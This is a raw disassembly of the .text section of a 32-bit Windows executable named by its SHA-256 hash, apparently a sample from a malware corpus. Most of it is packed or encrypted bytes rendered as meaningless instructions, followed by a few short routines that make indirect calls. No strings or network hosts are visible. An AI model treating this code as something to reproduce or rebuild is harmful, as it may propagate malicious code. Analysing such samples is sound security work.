
6456329b10d63a99539eadb5d99753397802a6f7c4acb5d8af2f5ef7edaf94e4.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	xchg   edx,eax
  4d0001:	(bad)  
  4d0002:	or     eax,0x87a3207f
  4d0007:	push   esp
  4d0008:	lahf   
  4d0009:	mov    ecx,0x874758a0
  4d000e:	dec    eax
  4d000f:	xor    BYTE PTR [ecx+0x2de7ae4a],al
  4d0015:	mov    al,0xb6
  4d0017:	mov    edx,0xd5d9a824
  4d001c:	or     BYTE PTR [ecx],ah
  4d001e:	stos   BYTE PTR es:[edi],al
  4d001f:	jmp    0x4d001d
  4d0021:	xor    esi,DWORD PTR [esi+esi*8-0x1efaffe]
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d0676
  4d06c1:	sbb    al,0x63
  4d06c3:	stos   DWORD PTR es:[edi],eax
  4d06c4:	pop    edi
  4d06c5:	call   0x7fea:0x52ed0194
  4d06cc:	sub    esp,ecx
  4d06ce:	fist   WORD PTR ds:[ebx-0x7f5ec0d0]
  4d06d5:	xor    eax,DWORD PTR [ecx-0x263f1903]
  4d06db:	(bad)  
  4d06dc:	mov    ds:0x77b4f9df,al
  4d06e1:	aam    0xf1
  4d06e3:	jmp    0x38d29286
  4d06e8:	cmp    dl,BYTE PTR [ecx-0xa02118]
  4d06ee:	adc    eax,0x4d2044
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d06fd:	sub    esp,0x4c
  4d0700:	lea    edx,ds:0x4d3088
  4d0706:	sub    DWORD PTR [edx+0x54],0x6e18
  4d070d:	push   edx
  4d070e:	push   0x0
  4d0710:	call   0x4d09e8
  4d0715:	add    esp,0x4
  4d0718:	pop    edx
  4d0719:	push   edx
  4d071a:	push   ecx
  4d071b:	push   ebx
  4d071c:	call   0x4d0cdc
  4d0721:	add    esp,0x8
  4d0724:	pop    edx
  4d0725:	push   edx
  4d0726:	mov    esi,0x0
  4d072b:	push   esi
  4d072c:	call   0x4d06ec
  4d0731:	add    esp,0x4
  4d0734:	pop    edx
  4d0735:	add    esp,0x4c
  4d0738:	pop    ebp
  4d0739:	ret    
  4d073a:	add    BYTE PTR [eax],al
  4d073c:	mov    edi,edi
  4d073e:	push   ebp
  4d073f:	mov    ebp,esp
  4d0741:	sub    esp,0x54
  4d0744:	lea    ecx,ds:0x4d30b8
  4d074a:	adc    DWORD PTR [ebp-0xc],0xffff88f2
  4d0751:	push   ecx
  4d0752:	push   DWORD PTR [ecx+0xfc]
  4d0758:	push   eax
  4d0759:	push   DWORD PTR [ecx+0x38]
  4d075c:	push   DWORD PTR [ecx+0x104]
  4d0762:	call   0x4d0c00
  4d0767:	add    esp,0x10
  4d076a:	pop    ecx
  4d076b:	push   ecx
  4d076c:	mov    edx,0x0
  4d0771:	push   edx
  4d0772:	call   0x4d0794
  4d0777:	add    esp,0x4
  4d077a:	pop    ecx
  4d077b:	mov    esi,0x4d2038
  4d0780:	mov    esi,DWORD PTR [esi]
  4d0782:	push   esi
  4d0783:	push   DWORD PTR [ecx+0x108]
  4d0789:	pop    edi
  4d078a:	call   edi
  4d078c:	add    esp,0x54
  4d078f:	pop    ebp
  4d0790:	ret    
  4d0791:	add    BYTE PTR [eax],al
  4d0793:	add    BYTE PTR [edi-0x1],bl
  4d0796:	adc    eax,0x4d2018
  4d079b:	call   edi
  4d079d:	add    BYTE PTR [eax],al
  4d079f:	add    BYTE PTR [edi-0x1],bl
  4d07a2:	adc    eax,0x4d2078
  4d07a7:	call   edi
